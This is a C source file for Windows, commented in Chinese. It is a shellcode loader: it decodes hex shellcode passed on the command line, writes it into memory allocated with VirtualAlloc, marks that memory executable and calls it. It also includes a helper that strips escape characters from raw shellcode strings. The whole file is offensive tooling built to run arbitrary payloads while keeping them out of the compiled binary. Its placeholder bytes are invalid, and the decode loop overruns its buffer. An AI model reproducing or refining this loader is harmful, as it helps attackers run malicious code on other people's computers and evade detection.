#include <stdio.h>
#include <Windows.h>

//原始shellcode过滤成字符串
/*
"\xac\xv2\x3f"
"\xac\xv2\x3f"
"\xac\xv2\x3f"
"\xac\xv2\x3f"
"\xac\xv2\x3f"
*/
void Compressed(const char* FileName)
{
    FILE* fp_read;
    char write_ch;
    if ((fp_read = fopen(FileName, "r")) != NULL)
    {
        while ((write_ch = fgetc(fp_read)) != EOF)
        {
            if (write_ch != L'\n' && write_ch != L'\"' && write_ch != L'\\' && write_ch != L'x' && write_ch != L';')
            {
                printf("%c", write_ch);
            }
        }
    }
    _fcloseall();
}

int main(int argc, char* argv[])
{
    unsigned int char_in_hex;

    char* shellcode = argv[1];
    unsigned int iterations = strlen(shellcode);

    unsigned int memory_allocation = strlen(shellcode) / 2;

    //十六进制的shellcode转换为可执行的代码
    for (unsigned int i = 0; i < iterations - 1; i++)
    {
        sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    }

    void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);
    DWORD ignore;
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
    (*(void(*)()) exec)();

    return 0;
}
